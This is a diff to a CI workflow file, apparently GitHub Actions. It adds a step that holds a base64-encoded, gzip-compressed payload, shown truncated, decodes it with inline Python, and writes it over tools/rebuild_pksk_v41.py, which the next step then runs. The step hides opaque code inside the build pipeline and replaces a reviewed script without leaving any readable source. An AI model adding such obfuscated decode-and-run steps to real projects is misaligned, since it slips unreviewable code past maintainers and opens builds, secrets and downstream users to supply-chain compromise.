@@ -18,6 +18,15 @@ jobs:
         with:
           fetch-depth: 0
 
+      - name: Restore generator
+        env:
+          PAYLOAD: H4sIAEcTgGoC/8V9y24cx5bgXl+RqAujSVaRYhUpyZdC3QYpybZMyk2J9DXuFQQhqjKqKpivYj5ElQgCvWrMboBetDc92/mA3tz9+E/8JXNeERmZlUXJ7jHGgMV8REacOHHecU6USZZZXgZXRZYOglylYZY8mOVZEixVuYjNJDDc4BxuHzxIVaKLYBy8/adjk6j0nwYBXKSK/iYm5/tipRZ49VylpnBX1Og7FZmEL1J58Mlc48XLfMb9vfz0iT8/XSiDf8+qaxnqlVrRRz+o0MjFxMR48VqZQuX07I2acY8X8uAim3Hr41DR2Mcxd/MNNFjIhSloAJNLv9VMUcfnValzw/2uVgzGxcoO8Xcc4t2DB6GeBXlWvs+WpcnSYkv+DgKVFjc6HwTFw...
+        run: |
+          python - <<'PY'
+          import os,base64,gzip
+          open('tools/rebuild_pksk_v41.py','wb').write(gzip.decompress(base64.b64decode(os.environ['PAYLOAD'])))
+          PY
+
       - name: Generate all 100 sets
         run: python tools/rebuild_pksk_v41.py
 
